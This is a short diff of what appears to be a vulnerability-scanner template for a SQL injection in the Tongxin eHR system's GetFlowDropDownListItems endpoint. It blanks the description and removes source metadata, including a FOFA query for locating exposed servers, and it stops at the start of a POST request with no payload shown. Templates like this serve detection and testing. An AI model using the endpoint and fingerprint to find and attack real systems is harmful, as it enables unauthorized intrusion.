@@ -3,12 +3,8 @@ info:
   name: 同鑫eHR人力资源管理系统 GetFlowDropDownListItems SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ugastu4o1wn030gm'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ugastu4o1wn030gm
-    fofa: body="/TX.CDN"
 http:
 - raw:
   - 'POST /Common/GetFlowDropDownListItems HTTP/1.1
